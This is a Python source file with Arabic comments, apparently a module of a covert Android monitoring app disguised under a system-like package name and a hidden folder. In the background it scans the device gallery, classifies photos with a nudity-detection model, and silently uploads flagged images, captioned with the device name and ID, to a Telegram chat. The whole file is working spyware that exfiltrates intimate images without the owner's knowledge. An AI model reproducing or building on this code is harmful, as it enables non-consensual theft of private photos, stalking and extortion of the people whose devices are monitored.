# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import sqlite3
import hashlib
import gc
from datetime import datetime

# ========== إعداد المسارات الموحدة ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
MODELS_DIR = os.path.join(P, "models")
if not os.path.exists(MODELS_DIR):
    os.makedirs(MODELS_DIR)

logging.basicConfig(filename=os.path.join(P, "n.log"), level=logging.ERROR, filemode='a')

# ========== استيراد المكتبات مع معالجة الأخطاء ==========
AI_AVAILABLE = False
Interpreter = None
np = None
Image = None
ImageOps = None

try:
    import numpy as np
    from PIL import Image, ImageOps, UnidentifiedImageError
    Image.MAX_IMAGE_PIXELS = 50_000_000

    # محاولة استيراد tflite-runtime أولاً
    try:
        from tflite_runtime.interpreter import Interpreter
        AI_AVAILABLE = True
        logging.info("Using tflite_runtime")
    except ImportError:
        # محاولة استيراد tensorflow كبديل
        try:
            import tensorflow as tf
            Interpreter = tf.lite.Interpreter
            AI_AVAILABLE = True
            logging.info("Using tensorflow.lite")
        except ImportError:
            logging.error("Neither tflite_runtime nor tensorflow available")
            raise ImportError("No TFLite backend available")
except ImportError as e:
    logging.error(f"Core libraries missing: {e}")
    # تعريفات وهمية للتوافق
    class Interpreter:
        pass


class NudeDetector:
    def __init__(self, mon=None):
        self.mon = mon
        self.active = False
        self._active_lock = threading.Lock()
        self.model = None
        self._model_lock = threading.RLock()  # قفل للوصول إلى النموذج
        self.last_run = 0
        self._loading_engine = False
        self._load_error_count = 0
        self._max_load_errors = 10
        self._input_size = (224, 224)  # افتراضي

        # البحث عن النموذج في عدة مواقع
        self.model_path = self._find_model()
        self.db = os.path.join(P, "n_cache.db")
        self._init_db()

        if AI_AVAILABLE and self.model_path:
            threading.Thread(target=self._load_engine_forever, daemon=True).start()
            logging.info("AI engine loading thread started")
        else:
            logging.warning(f"AI unavailable. Model path: {self.model_path}, AI_AVAILABLE: {AI_AVAILABLE}")

    def _find_model(self):
        """البحث عن ملف النموذج في عدة مواقع"""
        possible_paths = [
            os.path.join(MODELS_DIR, "engine_v2.tflite"),
            os.path.join(P, "engine_v2.tflite"),
            os.path.join(os.getcwd(), "assets", "engine_v2.tflite"),
            os.path.join(os.getcwd(), "engine_v2.tflite"),
            "/data/data/com.sys.shieldcore/files/.sys_runtime/models/engine_v2.tflite",
            "/data/data/com.sys.shieldcore/files/engine_v2.tflite"
        ]
        
        for path in possible_paths:
            try:
                if os.path.exists(path) and os.path.getsize(path) > 500000:
                    logging.info(f"✅ Found model at: {path}")
                    return path
            except:
                continue
                
        logging.error("❌ Model not found in any location")
        return None

    # ========== إدارة قاعدة البيانات ==========
    def _init_db(self):
        """تهيئة قاعدة البيانات مع قفل للتزامن"""
        try:
            with sqlite3.connect(self.db, check_same_thread=False) as conn:
                conn.execute('''CREATE TABLE IF NOT EXISTS scan_logs (
                    h TEXT PRIMARY KEY, 
                    ts INTEGER,
                    path TEXT
                )''')
                conn.execute('CREATE INDEX IF NOT EXISTS idx_ts ON scan_logs(ts)')
                
                # تنظيف السجلات القديمة (أكثر من 30 يوم)
                old = int(time.time()) - 30 * 86400
                conn.execute('DELETE FROM scan_logs WHERE ts < ?', (old,))
                conn.commit()
                
                # التحقق من صحة قاعدة البيانات
                conn.execute('PRAGMA integrity_check')
        except Exception as e:
            logging.error(f"DB init error: {e}")

    # ========== تحميل المحرك مع إعادة محاولة ==========
    def _load_engine_forever(self):
        """تحميل النموذج مع إعادة محاولة غير محدودة"""
        if not AI_AVAILABLE or self._loading_engine or not self.model_path:
            return
            
        self._loading_engine = True
        attempt = 0
        wait_time = 3

        while self._load_error_count < self._max_load_errors:
            try:
                if not os.path.exists(self.model_path):
                    logging.error(f"Model file not found: {self.model_path}")
                    time.sleep(10)
                    attempt += 1
                    continue

                file_size = os.path.getsize(self.model_path)
                if file_size < 500000:
                    logging.error(f"Model file too small: {file_size} bytes (<500KB)")
                    time.sleep(10)
                    attempt += 1
                    continue

                # تحميل النموذج
                self.model = Interpreter(model_path=self.model_path, num_threads=2)
                self.model.allocate_tensors()
                
                inputs = self.model.get_input_details()
                outputs = self.model.get_output_details()
                
                if not inputs or not outputs:
                    raise ValueError("Invalid model: no inputs/outputs")
                    
                self.in_idx = inputs[0]['index']
                self.out_idx = outputs[0]['index']
                
                # استخراج حجم الإدخال
                input_shape = inputs[0]['shape']
                if len(input_shape) >= 3:
                    self._input_size = (input_shape[1], input_shape[2])
                elif len(input_shape) >= 2:
                    self._input_size = (input_shape[1], input_shape[1])  # افترض مربع
                
                logging.info(f"✅ TFLite engine loaded successfully")
                logging.info(f"   Input size: {self._input_size}")
                logging.info(f"   Model size: {file_size / (1024*1024):.2f} MB")
                
                self._loading_engine = False
                self._load_error_count = 0
                return
                
            except Exception as e:
                self._load_error_count += 1
                logging.error(f"Load engine error (attempt {attempt+1}/{self._max_load_errors}): {e}")
                self.model = None
                wait_time = min(wait_time + 2, 60)
                
            attempt += 1
            time.sleep(wait_time)

        logging.error("❌ Max load attempts reached. AI permanently disabled.")
        self._loading_engine = False

    # ========== التحقق من جاهزية النموذج ==========
    def is_ready(self):
        """التحقق من أن النموذج جاهز للاستخدام"""
        with self._model_lock:
            return AI_AVAILABLE and self.model is not None

    def is_loading(self):
        """التحقق من أن النموذج قيد التحميل"""
        return self._loading_engine

    # ========== تحليل صورة واحدة ==========
    def analyze(self, path):
        """
        تحليل صورة وإرجاع احتمالية المحتوى الحساس (0.0 - 1.0)
        """
        # التحقق من المتطلبات الأساسية
        if not AI_AVAILABLE:
            logging.debug("AI not available")
            return 0.0

        if not Image or not np:
            logging.debug("PIL or numpy not available")
            return 0.0
            
        # التحقق من النموذج
        with self._model_lock:
            if self.model is None:
                # محاولة التحميل إذا لم يكن محملاً
                if not self._loading_engine and self._load_error_count < self._max_load_errors:
                    threading.Thread(target=self._load_engine_forever, daemon=True).start()
                return 0.0

        # التحقق من الملف
        if not path or not isinstance(path, str):
            return 0.0
            
        if not os.path.exists(path):
            return 0.0

        # التحقق من الحجم
        try:
            file_size = os.path.getsize(path)
            if file_size > 8 * 1024 * 1024:  # 8MB
                logging.debug(f"File too large: {file_size} bytes")
                return 0.0
            if file_size < 100:  # ملفات صغيرة جداً
                logging.debug(f"File too small: {file_size} bytes")
                return 0.0
        except:
            return 0.0

        # التحقق من الامتداد
        ext = os.path.splitext(path)[1].lower()
        if ext not in ['.png', '.jpg', '.jpeg', '.webp', '.bmp', '.gif', '.tiff']:
            return 0.0

        try:
            # فتح ومعالجة الصورة
            with Image.open(path) as raw_img:
                # التحقق من الأبعاد
                width, height = raw_img.size
                if width < 50 or height < 50:
                    logging.debug(f"Image too small: {width}x{height}")
                    return 0.0
                if width > 10000 or height > 10000:
                    logging.debug(f"Image too large: {width}x{height}")
                    return 0.0

                # مكافأة للصور العمودية (Portrait)
                aspect_bonus = 0.03 if height > width * 1.2 else 0.0
                
                # تغيير الحجم للإدخال
                try:
                    # محاولة استخدام ImageOps.fit للحصول على النسبة الصحيحة
                    img = ImageOps.fit(raw_img, self._input_size, method=Image.BILINEAR, centering=(0.5, 0.5))
                except:
                    # Fallback إلى resize
                    img = raw_img.convert('RGB').resize(self._input_size, Image.BILINEAR)

            # تحويل إلى مصفوفة
            img_array = np.asarray(img, dtype=np.float32)
            img_array = np.expand_dims(img_array, axis=0)  # إضافة بُعد الدفعة
            img_array = img_array / 255.0  # التطبيع إلى [0, 1]

            # التنبؤ
            with self._model_lock:
                self.model.set_tensor(self.in_idx, img_array)
                self.model.invoke()
                out = self.model.get_tensor(self.out_idx)[0]

            # استخراج الاحتمالية (بناءً على تنسيق الإخراج)
            if len(out) > 1:
                # إخراج ثنائي الفئة [normal, nude]
                prob = float(out[1]) / (float(out[0]) + float(out[1]) + 1e-8)
            else:
                # إخراج أحادي الفئة (احتمالية)
                prob = float(out[0])
                
            # التأكد من النطاق
            prob = min(max(prob, 0.0), 1.0)
            
            # إضافة المكافأة للصور العمودية
            prob = min(prob + aspect_bonus, 1.0)
            
            return prob
            
        except UnidentifiedImageError:
            logging.warning(f"Cannot identify image: {path}")
            return 0.0
        except Exception as e:
            logging.error(f"Analyze error on {path}: {e}")
            return 0.0

    # ========== المسح التلقائي ==========
    def scan(self):
        """بدء مسح تلقائي للصور المعلقة"""
        if not AI_AVAILABLE:
            return False

        if self.active:
            return False

        if not self.is_ready():
            if not self._loading_engine:
                threading.Thread(target=self._load_engine_forever, daemon=True).start()
            return False

        # التحقق من الفاصل الزمني (30 دقيقة)
        now = time.time()
        min_interval = 1800  # 30 دقيقة
        if (now - self.last_run) < min_interval:
            return False
            
        self.last_run = now
        
        # تشغيل في thread منفصل
        threading.Thread(target=self._worker, daemon=True).start()
        return True

    def _worker(self):
        """العملية الرئيسية للمسح"""
        if not self._active_lock.acquire(blocking=False):
            return
            
        try:
            self.active = True
            
            # الحصول على الماسح
            if not self.mon:
                logging.error("Monitor not available")
                return
                
            sc = getattr(self.mon, 'media_scanner', None)
            if not sc:
                logging.error("MediaScanner not available")
                return

            # جلب الصور المعلقة
            try:
                items = sc.get_gallery_by_category("pending", limit=30)
                if not items:
                    return
            except Exception as e:
                logging.error(f"Failed to get pending items: {e}")
                return

            processed = 0
            detected_count = 0
            
            for item in items:
                try:
                    path = item.get("path")
                    file_hash = item.get("hash")
                    label = item.get("label", "??")
                    
                    if not path or not os.path.exists(path):
                        continue

                    # التحقق من الكاش
                    if self._is_cached(file_hash):
                        continue

                    # التحليل
                    prob = self.analyze(path)
                    processed += 1

                    # تحديد الفئة
                    if prob > 0.85:
                        sc.update_category(file_hash, "nude", prob)
                        detected_count += 1
                        self._report(path, label, prob)
                    elif prob > 0.45:
                        sc.update_category(file_hash, "questionable", prob)
                    else:
                        sc.update_category(file_hash, "normal", prob)

                    # تسجيل في الكاش
                    self._mark_cached(file_hash, path)
                    
                    # تأخير قصير لتجنب استنزاف البطارية
                    if processed % 3 == 0:
                        time.sleep(0.3)
                        
                except Exception as e:
                    logging.error(f"Worker item error: {e}")
                    continue

            if detected_count > 0:
                logging.info(f"✅ Detected {detected_count} sensitive images")
                
        except Exception as e:
            logging.error(f"AI Worker error: {e}")
        finally:
            self.active = False
            self._active_lock.release()
            gc.collect()

    # ========== دوال الكاش ==========
    def _is_cached(self, h):
        """التحقق من وجود الملف في الكاش"""
        if not h:
            return False
        try:
            with sqlite3.connect(self.db, check_same_thread=False) as conn:
                cur = conn.execute("SELECT 1 FROM scan_logs WHERE h=?", (h,))
                return cur.fetchone() is not None
        except:
            return False

    def _mark_cached(self, h, path=""):
        """تسجيل الملف في الكاش"""
        if not h:
            return
        try:
            with sqlite3.connect(self.db, check_same_thread=False) as conn:
                conn.execute(
                    "INSERT OR REPLACE INTO scan_logs VALUES (?, ?, ?)", 
                    (h, int(time.time()), path or "")
                )
                conn.commit()
        except:
            pass

    # ========== إرسال التقرير ==========
    def _report(self, path, label, confidence):
        """إرسال تقرير بالصورة الحساسة"""
        if not self.mon:
            return
            
        tg = getattr(self.mon, 'ui', None)
        if not tg:
            logging.warning("Telegram UI not available for report")
            return

        # تحديد الهدف (vault أولاً، ثم control)
        target = getattr(tg, 'dat', None)
        if not target:
            target = getattr(tg, 'ctrl', None)
        if not target:
            logging.error("No target chat for report")
            return

        if not os.path.exists(path):
            logging.warning(f"Report path not found: {path}")
            return

        # معلومات الجهاز
        device_name = getattr(self.mon, 'dmd', 'Unknown')
        device_id = getattr(self.mon, 'did', 'Unknown')[:8]

        caption = (
            f"🔞 **AI Detection**\n"
            f"📱 Device: `{device_name}` ({device_id})\n"
            f"🏷️ Label: `{label}`\n"
            f"🎯 Confidence: `{confidence:.0%}`\n"
            f"⏰ Time: `{datetime.now().strftime('%H:%M:%S')}`"
        )

        try:
            with open(path, 'rb') as f:
                res = tg._api("sendPhoto", {
                    "chat_id": target,
                    "caption": caption,
                    "parse_mode": "Markdown",
                    "disable_notification": True
                }, {"photo": f})

            if not res or not res.get('ok'):
                logging.warning("Primary send failed for report")
                
        except Exception as e:
            logging.error(f"Report error: {e}")

    # ========== تنظيف الكاش ==========
    def clear_cache(self):
        """مسح ذاكرة التخزين المؤقت بالكامل"""
        try:
            with sqlite3.connect(self.db, check_same_thread=False) as conn:
                conn.execute("DELETE FROM scan_logs")
                conn.execute("VACUUM")
                conn.commit()
            logging.info("Cache cleared successfully")
            return True
        except Exception as e:
            logging.error(f"Clear cache error: {e}")
            return False

    def get_stats(self):
        """الحصول على إحصائيات الكاش"""
        try:
            with sqlite3.connect(self.db, check_same_thread=False) as conn:
                cur = conn.execute("SELECT COUNT(*) FROM scan_logs")
                total = cur.fetchone()[0]
                cur = conn.execute("SELECT MIN(ts), MAX(ts) FROM scan_logs")
                min_ts, max_ts = cur.fetchone()
                return {
                    "total": total,
                    "oldest": datetime.fromtimestamp(min_ts).isoformat() if min_ts else None,
                    "newest": datetime.fromtimestamp(max_ts).isoformat() if max_ts else None,
                    "model_ready": self.is_ready(),
                    "model_loading": self._loading_engine,
                    "active": self.active
                }
        except:
            return {"total": 0}


# ========== دالة المصنع ==========
def create(mon=None):
    return NudeDetector(mon)
